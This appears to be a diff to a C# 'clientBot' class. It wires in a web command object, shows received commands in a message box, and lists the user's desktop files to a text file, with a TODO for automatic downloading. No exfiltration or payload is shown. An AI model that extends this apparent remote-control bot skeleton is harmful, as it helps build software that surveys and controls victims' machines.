@@ -16,9 +16,10 @@ namespace clientBot4._7
     class BotFunctions
     {
         private Form form = new Form();
-        
-        public BotFunctions()
+        WebCommand wc;
+        public BotFunctions(WebCommand wc)
         {
+            this.wc = wc;
             //Todo AutoDownloadMethod
         }
 
@@ -49,6 +50,13 @@ namespace clientBot4._7
                 }
             }
         }
+
+        public void ShowMessage()
+        {
+            
+            MessageBox.Show(wc.command);
+        }   
+
         //можно супер кратко записать, но читабельность страдает
         public void GetAllFilesOnDesktop()
         {
@@ -57,7 +65,6 @@ namespace clientBot4._7
 
             using (StreamWriter sr = new StreamWriter("d:/deskTopfiles.txt"))
             {
-                int i = 0;
                 foreach(var file in files)
                 {
                     sr.WriteLine(file);
